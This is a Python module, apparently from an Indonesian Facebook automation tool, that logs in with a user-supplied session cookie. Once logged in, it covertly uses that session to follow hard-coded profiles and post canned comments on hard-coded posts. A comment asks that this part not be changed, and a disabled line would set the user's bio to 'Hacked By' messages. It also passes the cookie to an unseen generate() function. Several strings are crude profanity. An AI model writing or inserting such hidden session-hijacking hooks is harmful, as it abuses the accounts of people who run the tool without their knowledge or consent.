# hallo lurr:v

from .LAR import *
from .bahasa import lang
from .informasi import generate

anjay=random.choice(["Hacked By Diean Gans:v","Muka Gua Mirip Babi","Coli Is My Life","Tidak Ada Yang Aman:v","coli adalah jalan ninjaku"])
komentar1=random.choice(["keren","mantap bro sc nya","sagiri<3","lo ngentod ajg:v","hi i'm larteam-fb user"])
komentar2=random.choice(["keren","mantap bro sc nya","yang posting orang nya ganteng","lo ngentod ajg:v","hi i'm larteam-fb user"])

class login:
	def __init__(self,url,cookie):
		
		try: respon=req.get(f"{url}/profile.php?v=info",cookies=cookie)
		except koneksi_error: exit(" ! kesalahan pada koneksi")
		if "mbasic_logout_button" in respon.text:
			print("\n\n * hai welcome \x1b[1;35m"+parser(respon.text,"html.parser").find("title").text+"\x1b[0m Ngentod :v")
			print(" * mohon tunggu sebentar lurr :v")
			url=url.replace("mbasic","free") if "free.facebook" in respon.url else url
			if "Laporkan Masalah" not in respon.text:
				mmk=parser(respon.text,"html.parser").find("b",{"class":True})
				mmk="bahasa "+mmk.text.lower().replace("basa","").replace("bahasa","")+" terdeteksi" if mmk else ""
				exit(f" ! oops {mmk}, silahkan untuk merubah ke bahasa Indonesia terlebih dahulu melalui browser")
			generate(cookie["cookie"],parser(respon.text,"html.parser"))
			koh=yo_ndak_tau_kok_tanya_saya(url,cookie)
			# jangan di ganti ya bro hehehe :)
			koh.follow("/Diean.Ganteng")
			koh.follow("/100068019551652")
			koh.hoetang("/104410638502921","2",komentar1,True)
			koh.hoetang("/1685961541608783","8",komentar2,True)
			#koh.change_bio(anjay)
			print(" * login berhasil, mohon tunggu sedang membuka menu")
			waktu(1)
		else:
			exit("\n\n ! cookie invalid")